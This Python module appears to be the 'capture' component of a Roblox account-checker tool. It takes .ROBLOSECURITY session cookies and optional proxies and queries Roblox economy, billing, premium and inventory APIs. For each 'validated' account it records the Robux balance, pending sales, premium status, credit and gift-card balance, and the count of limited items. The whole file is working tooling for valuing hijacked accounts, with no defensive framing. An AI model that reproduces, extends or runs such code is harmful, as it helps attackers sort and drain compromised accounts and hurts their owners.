import aiohttp
import logging
from typing import Optional, Dict
from utils.config import Config

logger = logging.getLogger(__name__)


class RobuxCapture:
    """Captures Robux balance, premium status, and credit for validated accounts."""

    @staticmethod
    async def get_robux_balance(session: aiohttp.ClientSession, cookie: str, 
                                 user_id: int, proxy: Optional[str] = None) -> Dict:
        """
        Capture Robux balance and related financial info.
        Returns dict with robux, premium, credit, gift_card_balance.
        """
        result = {
            "robux": 0,
            "premium": False,
            "credit": 0.0,
            "gift_card_balance": 0.0,
            "has_premium_features": False,
        }

        headers = {**Config.HEADERS, "Cookie": f".ROBLOSECURITY={cookie}"}

        # Get Robux balance
        try:
            url = f"https://economy.roblox.com/v1/users/{user_id}/currency"
            async with session.get(url, headers=headers, proxy=proxy, 
                                   timeout=aiohttp.ClientTimeout(total=8)) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    result["robux"] = data.get("robux", 0)
                else:
                    # Fallback API
                    url2 = f"https://billing.roblox.com/v1/users/{user_id}/currency"
                    async with session.get(url2, headers=headers, proxy=proxy,
                                           timeout=aiohttp.ClientTimeout(total=8)) as resp2:
                        if resp2.status == 200:
                            data = await resp2.json()
                            result["robux"] = data.get("robux", 0)
        except Exception as e:
            logger.debug(f"Robux balance fetch failed for {user_id}: {e}")

        # Get premium status
        try:
            url = f"https://premiumfeatures.roblox.com/v1/users/{user_id}/validate-membership"
            async with session.get(url, headers=headers, proxy=proxy,
                                   timeout=aiohttp.ClientTimeout(total=8)) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    result["premium"] = data.get("isValid", False)
                    result["has_premium_features"] = data.get("isValid", False)
        except Exception as e:
            logger.debug(f"Premium check failed for {user_id}: {e}")

        # Get credit balance
        try:
            url = "https://billing.roblox.com/v1/credit"
            async with session.get(url, headers=headers, proxy=proxy,
                                   timeout=aiohttp.ClientTimeout(total=8)) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    result["credit"] = data.get("creditBalance", 0.0)
                    result["gift_card_balance"] = data.get("giftCardBalance", 0.0)
        except Exception as e:
            logger.debug(f"Credit balance fetch failed for {user_id}: {e}")

        # Check for Robux in transactions (pending Robux)
        try:
            url = f"https://economy.roblox.com/v1/users/{user_id}/transaction-totals?transactionType=Sale&timeFrame=Year"
            async with session.get(url, headers=headers, proxy=proxy,
                                   timeout=aiohttp.ClientTimeout(total=8)) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    # This gives us recent transaction data
                    if data.get("robux"):
                        result["pending_robux"] = data.get("robux", 0)
        except Exception as e:
            logger.debug(f"Transaction fetch failed for {user_id}: {e}")

        return result

    @staticmethod
    async def get_inventory_value(session: aiohttp.ClientSession, cookie: str,
                                   user_id: int, proxy: Optional[str] = None) -> Dict:
        """
        Get limited/collectible items value estimation.
        Returns info about collectibles and their approximate value.
        """
        result = {
            "collectible_count": 0,
            "limited_count": 0,
            "top_items": [],
        }

        headers = {**Config.HEADERS, "Cookie": f".ROBLOSECURITY={cookie}"}

        try:
            url = f"https://inventory.roblox.com/v1/users/{user_id}/assets/collectibles?limit=100&sortOrder=Desc"
            async with session.get(url, headers=headers, proxy=proxy,
                                   timeout=aiohttp.ClientTimeout(total=10)) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    items = data.get("data", [])
                    result["collectible_count"] = len(items)

                    # Get top 5 items by recent average price
                    for item in items[:5]:
                        result["top_items"].append({
                            "name": item.get("name", "Unknown"),
                            "asset_id": item.get("assetId", 0),
                        })

                    # Check for limited items
                    for item in items:
                        if item.get("isLimited", False) or item.get("isLimitedUnique", False):
                            result["limited_count"] += 1

        except Exception as e:
            logger.debug(f"Inventory fetch failed for {user_id}: {e}")

        return result